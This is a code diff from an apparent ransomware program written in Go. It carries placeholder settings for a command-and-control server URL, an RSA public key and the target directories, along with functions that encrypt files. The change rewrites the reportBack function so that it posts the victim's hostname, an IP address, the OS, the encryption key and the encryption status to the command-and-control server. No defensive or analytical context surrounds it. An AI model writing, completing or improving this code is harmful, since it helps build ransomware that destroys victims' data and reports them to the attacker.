@@ -7,6 +7,7 @@ import (
 	"crypto/x509"
 	"encoding/pem"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -14,7 +15,6 @@ import (
 
 const C2ServerUrl = "__C2_SERVER_URL__"
 const PublicKeyPEM = "__PUBLIC_KEY__"
-
 const TargetDirsString = "__TARGET_DIRECTORIES__"
 
 func encryptWithRSA(plainText []byte, pubKey *rsa.PublicKey) ([]byte, error) {
@@ -55,7 +55,6 @@ func processFiles() {
 		return
 	}
 
-	// تقسيم النص القادم إلى مصفوفة مجلدات بشكل آمن تماماً
 	targetDirectories := strings.Split(TargetDirsString, ",")
 
 	for _, dirName := range targetDirectories {
@@ -87,7 +86,20 @@ func processFiles() {
 }
 
 func reportBack() {
-	resp, err := http.Get(C2ServerUrl + "?status=rsa_encrypted")
+	hostname, err := os.Hostname()
+	if err != nil {
+		hostname = "Unknown-PC"
+	}
+
+	data := url.Values{}
+	data.Set("hostname", hostname)
+	data.Set("ip_address", "192.168.1.100")
+	data.Set("os", "Windows")
+	data.Set("encryption_key", PublicKeyPEM)
+	data.Set("encryption_type", "RSA")
+	data.Set("status", "rsa_encrypted")
+
+	resp, err := http.PostForm(C2ServerUrl, data)
 	if err == nil {
 		resp.Body.Close()
 	}
